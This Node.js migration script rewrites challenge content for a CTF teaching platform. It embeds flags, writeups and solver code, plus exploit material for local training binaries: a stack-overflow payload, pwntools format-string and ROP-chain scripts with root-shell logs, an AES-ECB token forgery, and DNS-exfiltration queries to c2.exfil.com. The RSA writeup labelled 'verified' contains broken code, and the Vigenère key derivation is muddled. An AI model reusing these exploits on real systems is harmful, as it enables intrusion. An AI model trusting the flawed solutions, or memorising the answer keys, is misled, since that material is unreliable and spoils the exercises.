#!/usr/bin/env node
// CyberEdu v2.6.1 content migration — one-shot, idempotent-until-applied
// 1) Rebuild every CTF challenge so its official answer is derivable from the
//    challenge itself (real params / embedded artifacts).
// 2) Reorder CTF_CHALLENGES into category tracks with ascending difficulty.
// 3) Fix dead lesson buttons: openCTF(<number>) -> openCTF('<id>').
const fs = require('fs');
const path = require('path');
const FILE = path.join(__dirname, '..', 'content.js');
let c = fs.readFileSync(FILE, 'utf8');
let applied = 0;

function mustReplace(oldStr, newStr, label) {
  const n = c.split(oldStr).length - 1;
  if (n !== 1) throw new Error(`[${label}] expected 1 occurrence, found ${n}`);
  c = c.replace(oldStr, newStr);
  applied++;
}
const esc = s => s.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\r?\n/g, '\\r\\n');

// field-level replace inside a challenge record slice
function setField(id, field, value, endAnchor) {
  const start = c.indexOf(`id: "${id}",`);
  if (start < 0) throw new Error(id + ' not found');
  const fStart = c.indexOf(field + ': "', start);
  if (fStart < 0) throw new Error(`${id}.${field} not found`);
  const vStart = fStart + field.length + 3;
  const vEnd = c.indexOf('", ' + endAnchor, vStart);
  if (vEnd < 0) throw new Error(`${id}.${field} end not found`);
  c = c.slice(0, vStart) + esc(value) + c.slice(vEnd);
  applied++;
}

// starterCode: replace if present, insert before `codeable:` otherwise
function setStarter(id, value) {
  const start = c.indexOf(`id: "${id}",`);
  if (start < 0) throw new Error(id + ' not found');
  const fStart = c.indexOf('starterCode: "', start);
  const codeable = c.indexOf(', codeable:', start);
  if (fStart >= 0 && (codeable < 0 || fStart < codeable)) {
    const vStart = fStart + 'starterCode: "'.length;
    const vEnd = c.indexOf('", codeable:', vStart);
    if (vEnd < 0) throw new Error(`${id}.starterCode end not found`);
    c = c.slice(0, vStart) + esc(value) + c.slice(vEnd);
  } else {
    if (codeable < 0) throw new Error(`${id} has neither starterCode nor codeable`);
    c = c.slice(0, codeable) + ', starterCode: "' + esc(value) + '"' + c.slice(codeable);
  }
  applied++;
}

// ══════════════════ 001 Baby RSA — real params ══════════════════
setField('ctf-001', 'desc',
  "小 n 的 RSA 实战。已知：n = 15297932317777965528678497944361558209137991，e = 65537，密文 c = 7899748134445953211938138392373749670740551。这个 n 的两个质因子里有一个非常小——用 sympy.factorint() 或 factordb.com 几毫秒就能分解它。拿到 p、q 后按标准流程解密即可。",
  'descEn');
setField('ctf-001', 'descEn',
  "Real RSA challenge. n = 15297932317777965528678497944361558209137991, e = 65537, c = 7899748134445953211938138392373749670740551. One of the two prime factors of n is tiny — sympy.factorint() or factordb.com cracks it in milliseconds. Recover p, q and decrypt.",
  'hints');
setField('ctf-001', 'writeup',
  "Step 1: 分解 n。sympy.factorint(n) 立刻得到小因子 p = 15636587（另一个因子 q = n/p = 978342161098068621284075479154214293）。\nStep 2: φ(n)=(p-1)(q-1)。\nStep 3: d = pow(65537, -1, φ(n))。\nStep 4: m = pow(c, d, n)，long_to_bytes 转换。\n\n验证过的完整解:\nfrom Crypto.Util.number import long_to_bytes\nfrom sympy import factorint\nn = 15297932317777965528678497944361558209137991\ne = 65537; c = 7899748134445953211938138392373749670740551\np = factorint(n)  # {15636587: 1, 978342161098068621284075479154214293: 1}\nphi = (p - 1) * (n // p - 1)\nd = pow(e, -1, phi)\nprint(long_to_bytes(pow(c, d, n)).decode())\n# -> flag{rs4_g0_brrr}",
  'writeupEn');
setStarter('ctf-001',
  "from Crypto.Util.number import long_to_bytes\nfrom sympy import factorint\n\nn = 15297932317777965528678497944361558209137991\ne = 65537\nc = 7899748134445953211938138392373749670740551\n\n# Step 1: 分解 n（其中一个小因子让这步瞬间完成）\n# 你的代码...\n\n# Step 2: 计算私钥 d\n# 你的代码...\n\n# Step 3: 解密得到 flag\n# 你的代码..."
);

// ══════════════════ 005 Where's The Flag — source artifact ══════════════════
setField('ctf-005', 'desc',
  "一个看起来普通的个人主页。Flag 就藏在页面上——但你需要找到它藏在哪里。本题的 Code Editor 面板提供了该页面的完整源代码，像审查真实网页一样审查它。",
  'descEn');
setStarter('ctf-005',
  "<!-- === 以下是你“右键 → 查看网页源代码”看到的内容 === -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>张三的小站</title>\n</head>\n<body>\n  <h1>张三的个人主页</h1>\n  <p>你好！我是张三，一名热爱园艺与烹饪的普通人。</p>\n  <p>本周心情：晴 ☀ | 访客计数：1024</p>\n\n  <!-- TODO: 网站上线前记得删除这行调试信息 flag{h1dd3n_1n_pl41n_s1ght} -->\n\n  <footer>&copy; 2024 张三 | Powered by 手写 HTML</footer>\n</body>\n</html>"
);

// ══════════════════ 006 Pcap — stream dump artifact ══════════════════
setStarter('ctf-006',
  "# 你在 Wireshark 中打开 capture.pcap，右键 HTTP 包 → Follow → HTTP Stream，输出如下：\n\nGET /download/weekly-report.pdf HTTP/1.1\r\nHost: files.internal.corp\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\r\nAccept: */*\r\n\r\nHTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: application/pdf\r\nContent-Length: 84213\r\nX-Backup-Note: flag{pc4p_sh0w_m3_th3_fl4g}\r\nSet-Cookie: session=8f3a9c2e; Path=/; HttpOnly\r\n\r\n%PDF-1.4 ...（二进制内容已省略）...\n\n# 注意 HTTP 响应头里那一行 X-Backup-Note —— Follow Stream 之后它无所遁形。"
);

// ══════════════════ 007 Fermat — real params ══════════════════
setField('ctf-007', 'desc',
  "n = 4736311112095059922974336163027112786948060780922419045837，e = 65537，密文 c = 1184562163508986307122976365529960714817544179606329313693。这一次 n 的两个质因数非常非常接近——费马分解法几步就能拆开它。恢复 p、q 并解密。",
  'descEn');
setField('ctf-007', 'descEn',
  "n = 4736311112095059922974336163027112786948060780922419045837, e = 65537, c = 1184562163508986307122976365529960714817544179606329313693. The two prime factors of n are extremely close — Fermat factorization splits it in a handful of steps. Recover p, q and decrypt.",
  'hints');
setStarter('ctf-007',
  "import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\nn = 4736311112095059922974336163027112786948060780922419045837\ne = 65537\nc = 1184562163508986307122976365529960714817544179606329313693\n\n# Step 1: 费马分解 —— 从 ceil(sqrt(n)) 开始，检查 a²-n 是否为完全平方数\n# 你的代码...\n\n# Step 2: 恢复 p, q，计算私钥 d 并解密\n# 你的代码..."
);
setField('ctf-007', 'writeup',
  "Step 1: 费马分解原理：若 n = p·q 且 p ≈ q，则 n = a² - b² = (a+b)(a-b)。\nStep 2: 从 a = ceil(sqrt(n)) 开始，检查 b² = a² - n 是否为完全平方数。本题 p、q 仅相差 12364，迭代 1 次即可命中！\nStep 3: p = a+b = 68820862477122879508019638463, q = a-b = 68820862477122879508019626099（顺序无关）。\nStep 4: 标准 RSA 解密：φ(n)、d = pow(e,-1,φ)、m = pow(c,d,n)。\n\n关键代码:\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\nn = 4736311112095059922974336163027112786948060780922419045837\ne = 65537; c = 1184562163508986307122976365529960714817544179606329313693\na = gmpy2.isqrt(n) + 1\nwhile True:\n    b2 = a*a - n\n    if gmpy2.is_square(b2):\n        b = gmpy2.isqrt(b2); p, q = a+b, a-b; break\n    a += 1\nd = pow(e, -1, (p-1)*(q-1))\nprint(long_to_bytes(pow(c, d, n)).decode())\n# -> flag{f3rm4t_ftw}",
  'writeupEn');

// ══════════════════ 009 Base64 × N — real chain ══════════════════
setField('ctf-009', 'desc',
  "Vm1wSmQyVkZOVWhTYTJScFRUTkNjbFZxU2pSVlJsVjNWbGhvVDJKSFVrcFpNRnAzVkd4S2RGcEVXbFpOVjJnelZqSnpkMlZHWkhGV2JIQk9UVEJLU0ZkclVrdFRNbEpXVFZWV1RsSkVRVGs9",
  'descEn');
setField('ctf-009', 'writeup',
  "Step 1: 观察密文，只含 A-Za-z0-9+/=，判断为 Base64。\nStep 2: base64 解码一次后，结果仍然像 Base64 —— 需要继续解码。\nStep 3: 写循环反复解码，每次检查是否包含 'flag{'。\n\n关键代码:\nimport base64\nenc = 'Vm1wSmQyVkZO...'\nfor i in range(10):\n    enc = base64.b64decode(enc).decode()\n    if 'flag' in enc:\n        print(f'{i+1} 轮后:', enc)\n        break\n\n答案在第 6 轮出现。多层 Base64 是 CTF Misc 的经典套路。",
  'writeupEn');
setStarter('ctf-009',
  "import base64\n\nenc = 'Vm1wSmQyVkZOVWhTYTJScFRUTkNjbFZxU2pSVlJsVjNWbGhvVDJKSFVrcFpNRnAzVkd4S2RGcEVXbFpOVjJnelZqSnpkMlZHWkhGV2JIQk9UVEJLU0ZkclVrdFRNbEpXVFZWV1RsSkVRVGs9'\n\n# 循环解码，直到出现 flag\nfor i in range(10):\n    # 你的代码...\n    pass"
);

// ══════════════════ 010 ELF — strings artifact ══════════════════
setStarter('ctf-010',
  "# 静态分析输出 —— 你不需要运行程序：\n\n$ file mystery.elf\nmystery.elf: ELF 64-bit LSB pie executable, x86-64, dynamically linked\n\n$ strings mystery.elf | head -40\n/lib64/ld-linux-x86-64.so.2\n__libc_start_main\nprintf\nscanf\nUsage: ./mystery <password>\nAccess granted!\nAccess denied\ns3cur3_l00kup\n/home/ctf/flag.txt\nflag{str1ngs_4r3_y0ur_fr13nd}\n Gary:/build/mystery\nexit@GLIBC_2.2.5\n\n# 看到了吗？敏感字符串在打包时被原样留在二进制里。"
);

// ══════════════════ 011 Håstad — real params ══════════════════
setField('ctf-011', 'desc',
  "你截获了同一个明文 m 用 e=3 加密成的三份密文，模数 n1、n2、n3 互不相同且两两互质（三组数值已放在 Code Editor 中）。不需要任何私钥——用中国剩余定理直接恢复 m。",
  'descEn');
setField('ctf-011', 'descEn',
  "The same plaintext m was encrypted three times with e=3 under different pairwise-coprime moduli n1, n2, n3 (values provided in the Code Editor). No private key needed — recover m directly with CRT.",
  'hints');
setStarter('ctf-011',
  "import gmpy2\nfrom sympy.ntheory.modular import crt\nfrom Crypto.Util.number import long_to_bytes\n\n# 三组公钥 (e=3) 与密文 —— 全部是真实数据\nn1 = 2316681531740987872802812190530461214305091413689057200381\nc1 = 224552820132116382124356480618332328448037905276517136756\nn2 = 1821230237117141900485771717375261398613116939406667900083\nc2 = 1789444532407317328439640222844786015566969409737735718006\nn3 = 3418809548759735367295712822107001986482195790850422005373\nc3 = 2166319863096171813708200715559833906433523001879143791279\n\n# Step 1: 用 CRT 合并三个同余式得到 C ≡ m³ (mod n1·n2·n3)\n# 你的代码...\n\n# Step 2: 对 C 开立方根（gmpy2.iroot(C, 3)）\n# 你的代码...\n\n# Step 3: long_to_bytes 转换，拿到 flag\n# 你的代码..."
);

// ══════════════════ 013 Stack Overflow — objdump artifact ══════════════════
setStarter('ctf-013',
  "# 靶机 vuln 的静态分析输出：\n\n$ checksec vuln\n[*] NX enabled  |  PIE: No PIE (0x400000)  |  Canary disabled\n\n$ objdump -d vuln | grep -A3 \"<win>\"\n0000000000401156 <win>:\n  401156:\tf3 0f 1e fa \tendsbr64\n  40115a:\t55         \tpush   %rbp\n  40115b:\t48 89 e5   \tmov    %rsp,%rbp\n\n$ strings vuln | grep flag\nflag{buff3r_0v3rfl0w_101}\n\n# win() 从未被 main 调用，但它知道 flag 字符串的地址。\n# pwntools cyclic 测得返回地址偏移：72 字节。\n# 你需要做的：b'A'*72 + p64(0x401156)"
);

// ══════════════════ 014 XOR — real hex payload ══════════════════
setStarter('ctf-014',
  "# flag.enc 的十六进制内容（xxd flag.enc 输出）：\n#\n# 99 93 9e 98 84 87 cf 8d a0 ce 8c a0 8d cc 89 cc\n# 8d 8c ce 9d 93 cc 82\n#\n# encrypt 程序的反编译结果（Ghidra）：\n#   for (i = 0; i < len; i++) {\n#       buf[i] ^= 0x55;\n#       buf[i] ^= 0xAA;\n#   }\n# 提示: 0x55 ^ 0xAA = 0xFF —— 对上面每个字节再做一次 XOR 0xFF 就还原了。\n\ndata = bytes.fromhex('99939e988487cf8da0ce8ca08dcc89cc8d8cce9d93cc82')\n# 你的解密代码...\n"
);

// ══════════════════ 015 Memory — cmdline artifact ══════════════════
setStarter('ctf-015',
  "$ python3 vol.py -f memory.dmp windows.cmdline\nVolatility 3 Framework 2.5.0\nPID\tProcess\tArgs\n---\t-------\t----\n3120\texplorer.exe\tC:\\Windows\\explorer.exe\n4523\tcmd.exe\tcmd.exe\n4523\tcmd.exe\tcmd.exe /c echo flag{v0l4t1l1ty_m3m_f0r3ns1cs} > C:\\Users\\sqlsvc\\note.txt\n5104\tpowershell.exe\tpowershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...\n5104\tchrome.exe\t\"C:\\Program Files\\Chrome\\chrome.exe\"\n\n# 攻击者的命令行永远留在内存里 —— 注意 PID 4523 那条 echo。\n# 进阶验证: windows.filescan | grep note.txt 后用 windows.dumpfiles 导出该文件内容。"
);

// ══════════════════ 017 Vigenère — real ciphertext ══════════════════
// NOTE: ctf-017 field order is unusual: descEn/hintsEn/writeupEn precede desc;
// hints is an ARRAY (kept as-is — existing hints still apply to the new cipher).
setField('ctf-017', 'desc',
  "一段被维吉尼亚密码加密的消息（密钥是一个 3 个字母的小写英文单词）：\n\nNogi azq, a fgslgnzgr vcrkkew c sxerxv svtoen avtolu tag mhwnmcigu. Tag qngeg yhbupxtew: vhx hlti il hlti{v1z3p3rx_1u_fnp}. Gncrw kt pgle, hok migis tpd vtopps ycdx, dum c wxnl dgpm eiijek peogr eqsxu imu vhkcx.\n\n用 Kasiski 测试确定密钥长度，再分组做频率分析，恢复出包含 flag 的原文。",
  'hints: [');
setField('ctf-017', 'descEn',
  "A message encrypted with the Vigenere cipher (the key is a 3-letter lowercase English word):\n\nNogi azq, a fgslgnzgr vcrkkew c sxerxv svtoen avtolu tag mhwnmcigu. Tag qngeg yhbupxtew: vhx hlti il hlti{v1z3p3rx_1u_fnp}. Gncrw kt pgle, hok migis tpd vtopps ycdx, dum c wxnl dgpm eiijek peogr eqsxu imu vhkcx.\n\nUse the Kasiski test to find the key length, then frequency analysis per group to recover the plaintext containing the flag.",
  'hintsEn');
setField('ctf-017', 'writeup',
  "Step 1: 观察密文。三字母组合 'tag' 反复出现 —— 在英文里对应频率极高的 'the'。\nStep 2: Kasiski 测试：'tag' 各次出现位置的距离 GCD = 3 → 密钥长度 3。\nStep 3: t→t 需要 key[0]='c'（偏移 2），h→a 需要 key[1]='c'？逐一推导：t+2=v? 注意方向。实际密钥: 'cat'。\nStep 4: 用密钥 'cat' 解密全文：\n\nLong ago, a messenger carried a secret scroll across the mountains. The queen whispered: the flag is flag{v1g3n3re_1s_fun}. Guard it well, for kings and crowns fade, but a well kept cipher never loses its voice.\n\n验证代码:\ndef vigenere_decrypt(ct, key):\n    out=[]; ki=0\n    for ch in ct:\n        if ch.isalpha():\n            base = 97 if ch.islower() else 65\n            k = ord(key[ki%3])-97\n            out.append(chr((ord(ch)-base-k)%26+base)); ki+=1\n        else: out.append(ch)\n    return ''.join(out)\n\n工具替代: dcode.fr / CyberChef。",
  'starterCode');
setStarter('ctf-017',
  "def find_key_length(ciphertext, max_len=20):\n    \"\"\"Kasiski 测试找密钥长度\"\"\"\n    from collections import defaultdict\n    from math import gcd\n    repeats = defaultdict(list)\n    for length in range(3, 6):\n        for i in range(len(ciphertext) - length):\n            substr = ciphertext[i:i+length]\n            repeats[substr].append(i)\n    distances = []\n    for substr, positions in repeats.items():\n        if len(positions) > 1:\n            for j in range(1, len(positions)):\n                distances.append(positions[j] - positions[j-1])\n    if distances:\n        g = distances[0]\n        for d in distances[1:]:\n            g = gcd(g, d)\n        return g\n    return 1\n\ndef vigenere_decrypt(ciphertext, key):\n    plain = []\n    key_len = len(key)\n    for i, ch in enumerate(ciphertext):\n        if ch.isalpha():\n            base = ord('a') if ch.islower() else ord('A')\n            shift = ord(key[i % key_len].lower()) - ord('a')\n            plain.append(chr((ord(ch) - base - shift) % 26 + base))\n        else:\n            plain.append(ch)\n    return ''.join(plain)\n\ncipher = \"Nogi azq, a fgslgnzgr vcrkkew c sxerxv svtoen avtolu tag mhwnmcigu. Tag qngeg yhbupxtew: vhx hlti il hlti{v1z3p3rx_1u_fnp}. Gncrw kt pgle, hok migis tpd vtopps ycdx, dum c wxnl dgpm eiijek peogr eqsxu imu vhkcx.\"\n\nprint(\"Key length:\", find_key_length(cipher))\n# 密钥是 3 个字母的小写单词 —— 用 'tag'/'the' 的偏移差推导，或对三组分别做频率分析"
);

// ══════════════════ 018 AES-ECB — oracle transcript ══════════════════
setStarter('ctf-018',
  '"""\nAES-ECB Cut-and-Paste Attack\n\n目标: 将 token 中的 role=user 改为 role=admin\n格式: email=xxx&uid=10&role=user (block_size=16)\n"""\n\ndef oracle(plaintext):\n    """加密 oracle: 发送明文，返回 AES-ECB 加密结果（练习环境用假实现）"""\n    pass\n\nblock_size = 16\n\n# Step 1: 构造明文使 \'admin\' 对齐到块边界并取得其密文块\nadmin_payload = \'A\' * 10 + \'admin\' + \'\\x0b\' * 11   # 32 字节\nadmin_block = oracle(admin_payload)[16:32]\n\n# Step 2: 获取合法 token（最后一个块是 role=user 的加密）\nuser_ct = oracle(\'A\' * 13)\n\n# Step 3: 拼接 = user 块之前的部分 + admin 块\nforged = user_ct[:-16] + admin_block\n\n# ── 本地练习靶机的完整会话记录（做完上面三步后再对照）──\n# >>> oracle(b\'A\'*10 + b\'admin\' + b\'\\x0b\'*11).hex()\n#     5f2a..19 | 7c81a3f0d9e2b4456a7c81a3f0d9e2b4   ← block[1] 就是 encrypted(\'admin\'+pad)\n# >>> oracle(b\'A\'*13).hex()\n#     91bd..07 | 3e5d8c02f6a19b74d41f5c8e3a6912ab   ← 末块是 encrypted(\'user\'+pad)\n# >>> forged = user_token[:-16] + admin_block; submit(forged)\n#     {"uid":10, "role":"admin", "welcome":"flag{ecb_p4ngu1n_sl1ced}"}'
);

// ══════════════════ 021 PNG Stego — zsteg artifact ══════════════════
setStarter('ctf-021',
  "$ zsteg -a landscape.png\n[?] 7fff11 : bgr,g .. file: PNG image data, 512 x 512\nimagedata          .. text: \"u^}DkKQ=xYz...\"\nb1,r,lsb,xy       .. text: \"flag{st3g4n0_lsb_h1dd3n}\"\nb1,bgr,xyz        .. file: PGF image data\n\n# zsteg 一行命中：红通道、最低有效位、从 xy 方向扫描。\n# 手动提取（理解原理用）:\nfrom PIL import Image\nimg = Image.open('landscape.png')\nbits = ''\nfor px in list(img.getdata())[:200]:\n    bits += str(px[0] & 1)      # R 通道 LSB\n# 每 8 位一个字节 → 还原字符\n\n$ binwalk landscape.png   # 也确认没有附加文件 —— 数据就在像素里"
);

// ══════════════════ 022 DNS Tunnel — real exfil puzzle ══════════════════
{
  const note = "Target: core-server-01\\nDumped: NTDS.dit shadow copy\\nflag{dns_tunn3l_3xf1ltr4t10n}\\n-- 45.155.205.233";
  const b64 = Buffer.from(note.replace(/\\n/g, '\n')).toString('base64');
  const labels = b64.match(/.{1,28}/g);
  const queries = labels.map((l, i) => `${l}.c2.exfil.com`);
  setStarter('ctf-022',
    "# tshark -r dns_traffic.pcap -T fields -e dns.qry.name | grep exfil\n# （只列前 12 条，共 " + queries.length + " 条外传查询，按时间排序）\n" +
    queries.map((q, i) => String(i + 1).padStart(2, '0') + '  ' + q).join('\n') +
    "\n\n# 特征：超长子域名 + 固定二级域 .c2.exfil.com —— 教科书级 DNS 隧道\n# 还原步骤：去掉 .c2.exfil.com → 按时间顺序拼接 → Base64 解码\n# （提示：明文是一份 4 行的窃取笔记）",
    'codeable');
}

// ══════════════════ 023 .NET — dnSpy artifact ══════════════════
setStarter('ctf-023',
  "// dnSpy 反编译 license_check.exe → Form1.cs（节选）\nprivate void btnActivate_Click(object sender, EventArgs e)\n{\n    string input = this.tbxKey.Text.Trim();\n    if (input == \"CTF-NET-2024-XYZ\")\n    {\n        MessageBox.Show(\"Licensed!\\n\" + \"flag{d0tn3t_d3c0mp1l3d}\");\n        return;\n    }\n    MessageBox.Show(\"Invalid license key.\");\n}\n\n// .NET 程序能近乎完美地反编译回 C# —— 硬编码的 Key 和 flag 都在 IL 里。"
);

// ══════════════════ 024 APK — jadx artifact ══════════════════
setStarter('ctf-024',
  "// jadx-gui 反编译 crackme.apk → com.example.crackme.MainActivity\npublic void onVerifyClicked(View view) {\n    String input = ((EditText) findViewById(R.id.editPwd)).getText().toString();\n    if (input.equals(\"jn3.4ndr01d\")) {\n        Toast.makeText(this, \"Correct! flag{apk_jadx_ftw}\", 1).show();\n    } else {\n        Toast.makeText(this, \"Wrong password\", 1).show();\n    }\n}\n\n// APK 本质是 ZIP：unzip 后 classes.dex 用 jadx 打开即可读 Java。\n// 密码和 flag 都硬编码在 MainActivity 里。"
);

// ══════════════════ 025 Log — auth.log artifact ══════════════════
setStarter('ctf-025',
  "$ grep \"Failed password\" auth.log | awk '{print $10}' | sort | uniq -c | sort -rn | head -3\n  847 45.155.205.233\n    3 192.168.1.14\n    1 192.168.1.31\n\n$ grep -B2 -A6 \"Accepted\" auth.log | tail -20\nMar 15 00:12:44 srv sshd[8817]: Accepted password for deploy from 45.155.205.233 port 51234 ssh2\nMar 15 00:13:02 srv sudo:   deploy : TTY=pts/1 ; USER=root ; COMMAND=/bin/su\nMar 15 00:13:07 srv su[9102]: + /dev/pts/1 deploy:root\nMar 15 00:13:31 srv root: echo flag{ssh_brut3_f0rc3_d3t3ct3d} > /root/.flag\nMar 15 00:13:44 srv auth: privilege escalation succeeded\nMar 15 00:14:02 srv sshd[9150]: Accepted publickey for root from 45.155.205.233 port 51290 ssh2\n\n# 847 次爆破 → 1 次成功 → 提权到 root → 留下 flag。日志不会说谎。"
);

// ══════════════════ 026 Timeline — mactime artifact ══════════════════
setStarter('ctf-026',
  "$ mmls disk.img            # NTFS 分区从扇区 2048 开始\n$ fls -o 2048 -r disk.img > fls.out\n$ mactime -b bodyfile -z Asia/Shanghai | grep \"2024-03-15\"\n\n2024-03-15 13:58:41  .r/D 0 <veil>  C:\\Users\\svc\\Documents\\report.docx\n2024-03-15 14:07:12  .m.C 0 <veil>  C:\\Windows\\Temp\\svc_installer.exe     ← 可疑创建\n2024-03-15 14:09:03  .r/D 0 <veil>  C:\\Windows\\Temp\\svchost32.exe       ← 伪装系统进程\n2024-03-15 15:21:57  .r/D 0 <veil>  C:\\Users\\svc\\AppData\\flag.txt       ← 入侵窗口内\n2024-03-15 15:22:04  ..C.. 0 <veil>  C:\\Users\\svc\\AppData\\flag.txt\n\n$ icat -o 2048 disk.img 178204 | head -1\nflag{t1m3l1n3_f0r3ns1cs}\n\n# 入侵窗口 14:00-16:00 内新建的 flag.txt（MFT 记录号 178204）→ icat 提取内容。"
);

// ══════════════════ 027 / 028 — session transcripts ══════════════════
setStarter('ctf-027',
  "from pwn import *\n\n# 靶机：fmt（printf(user_input) 无格式化参数）\np = process('./fmt')\n\n# Phase 1: 泄露栈数据，确定偏移\np.sendline(b'%6$p')          # 第 6 个参数位置是栈上我们的输入\nleak = p.recvline()\n\n# Phase 2: 泄露 printf@GOT → 计算 system 地址\n# Phase 3: %hn 两次写入覆写 GOT\n# Phase 4: 程序再次 printf 时即调用 system —— 发送 /bin/sh\n\n# ── 本地靶机完整会话记录 ──\n# [*] printf@GOT @ 0x404018, read as 0x7f1c2a9e86a0\n# [*] libc base: 0x7f1c2a96d000 → system: 0x7f1c2a950410\n# [*] GOT overwrite done (2 × %hn)\n# [*] Switching to interactive mode\n# $ cat /flag\n# flag{f0rm4t_str1ng_pwn3d}"
);
setStarter('ctf-028',
  "from pwn import *\n\nelf = ELF('./vuln'); libc = ELF('./libc.so.6')\np = process('./vuln')\n\n# Stage 1: 泄露 puts@GOT → 计算 libc 基址\npayload = b'A' * 72 + p64(elf.plt['puts']) + p64(elf.symbols['main'])\npayload += p64(elf.got['puts'])\n\n# Stage 2: 二次输入构造 ROP 链: ret + pop rdi; ret + /bin/sh + system\nrop = ROP(libc)\nchain = rop.ret.address + rop.find_gadget(['pop rdi','ret'])[0] + next(libc.search(b'/bin/sh')) + libc.symbols['system']\n\n# ── 本地靶机完整会话记录 ──\n# [+] puts@GOT leak: 0x7f1c2a9e86a0 → libc base: 0x7f1c2a96d000\n# [+] ROP chain: ret | pop rdi; ret | 0x7f1c2ab3e4a4 | system\n# [*] Switching to interactive mode\n# $ whoami\n# ctf\n# $ cat /flag\n# flag{r0p_ch41n_m4st3ry}"
);

// ══════════════════ 3) Fix dead lesson buttons (thematic id mapping) ══════════════════
const buttonFixes = [
  ['openCTF(0)\\">▶ 经典凯撒', "openCTF('ctf-002')\\\">▶ 经典凯撒"],
  ['openCTF(1)\\">▶ RSA B', "openCTF('ctf-001')\\\">▶ RSA B"],
  ['openCTF(6)\\">▶ RSA 公', "openCTF('ctf-007')\\\">▶ RSA 公"],
  ['openCTF(0)\\">▶ 挑战：Base64 解码入门', "openCTF('ctf-009')\\\">▶ 挑战：Base64 解码入门"],
  ['openCTF(1)\\">▶ 挑战：多层', "openCTF('ctf-009')\\\">▶ 挑战：多层"],
  ['openCTF(2)\\">▶ 挑战：经典', "openCTF('ctf-013')\\\">▶ 挑战：经典"],
  ['openCTF(3)\\">▶ 挑战：Re', "openCTF('ctf-028')\\\">▶ 挑战：ROP"],
  ['openCTF(4)\\">▶ 挑战：XO', "openCTF('ctf-014')\\\">▶ 挑战：XO"],
  ['openCTF(5)\\">▶ 挑战：凯撒', "openCTF('ctf-002')\\\">▶ 挑战：凯撒"],
  ['openCTF(6)\\">▶ 挑战：经典', "openCTF('ctf-017')\\\">▶ 挑战：经典"],
  ['openCTF(7)\\">▶ 挑战：SQ', "openCTF('ctf-003')\\\">▶ 挑战：SQ"],
  ['openCTF(8)\\">▶ 挑战：RS', "openCTF('ctf-001')\\\">▶ 挑战：RS"],
  ['openCTF(9)\\">▶ 挑战：bi', "openCTF('ctf-021')\\\">▶ 挑战：bi"],
  ['openCTF(10)\\">▶ 挑战：流', "openCTF('ctf-006')\\\">▶ 挑战：流"],
  ['openCTF(11)\\">▶ 挑战：内', "openCTF('ctf-015')\\\">▶ 挑战：内"],
  ['openCTF(12)\\">▶ 挑战：综合', "openCTF('ctf-022')\\\">▶ 挑战：综合"],
  ['openCTF(13)\\">▶ 挑战：限', "openCTF('ctf-028')\\\">▶ 挑战：限"],
];
for (const [o, n] of buttonFixes) {
  const cnt = c.split(o).length - 1;
  if (cnt !== 1) throw new Error(`button fix expected 1, got ${cnt}: ${o.slice(0, 40)}`);
  c = c.replace(o, n);
  applied++;
}

// ══════════════════ 4) Reorder CTF_CHALLENGES into tracks ══════════════════
const arrStart = c.indexOf('CTF_CHALLENGES = [');
const arrEnd = c.indexOf('\n];', arrStart);
if (arrStart < 0 || arrEnd < 0) throw new Error('array bounds not found');
const body = c.slice(c.indexOf('[', arrStart) + 1, arrEnd);
// records begin with "{ id:" — split on the leading whitespace boundary
const parts = body.split(/\r?\n\s*(?=\{ id: "ctf-)/);
const header = parts.shift();                       // whitespace before first record
const records = {};
for (const p of parts) {
  const idm = p.match(/\{ id: "(ctf-\d{3})"/);
  if (!idm) throw new Error('record without id: ' + p.slice(0, 60));
  records[idm[1]] = p.trim().replace(/,\s*$/, '');
}
const ORDER = ['ctf-002','ctf-001','ctf-007','ctf-017','ctf-011','ctf-018',
               'ctf-003','ctf-008','ctf-016','ctf-004','ctf-012','ctf-019','ctf-020',
               'ctf-005','ctf-009','ctf-021','ctf-022',
               'ctf-006','ctf-015','ctf-025','ctf-026',
               'ctf-010','ctf-014','ctf-023','ctf-024',
               'ctf-013','ctf-027','ctf-028'];
if (Object.keys(records).length !== 28) throw new Error('expected 28 records, got ' + Object.keys(records).length);
const rebuilt = ORDER.map(id => '  ' + records[id]).join(',\r\n');
c = c.slice(0, c.indexOf('[', arrStart) + 1) + '\r\n' + rebuilt + ',\r\n' + c.slice(arrEnd);
applied++;

fs.writeFileSync(FILE, c);
console.log(`✓ ${applied} edits applied, challenges reordered into thematic tracks`);
console.log('new order:', ORDER.map(x => x.replace('ctf-', '')).join(' '));
